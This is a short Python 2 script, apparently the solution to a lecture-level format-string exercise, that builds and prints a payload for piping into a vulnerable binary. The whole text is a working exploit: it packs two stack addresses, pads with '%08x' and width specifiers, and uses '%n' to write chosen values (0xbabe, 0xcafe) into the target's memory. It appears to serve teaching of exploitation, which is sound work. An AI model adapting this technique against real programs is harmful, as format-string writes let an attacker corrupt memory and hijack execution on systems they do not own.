# python /tmp/fmt03_sploit.py | /levels/lecture/format_strings/fmt_lec03 

import struct

payload  = struct.pack('<L', 0xbffff624)
payload += "AAAA"
payload += struct.pack('<L', 0xbffff626)
payload += "AAAA"

payload += "%08x" * 4
payload += "%47758x" # 0xbabe - 0x38 + 8 = 47758
payload += "%n"

payload += "%4160x"  # 0xcafe - 0xbac6 + 8 = 4160
payload += "%n"

print payload
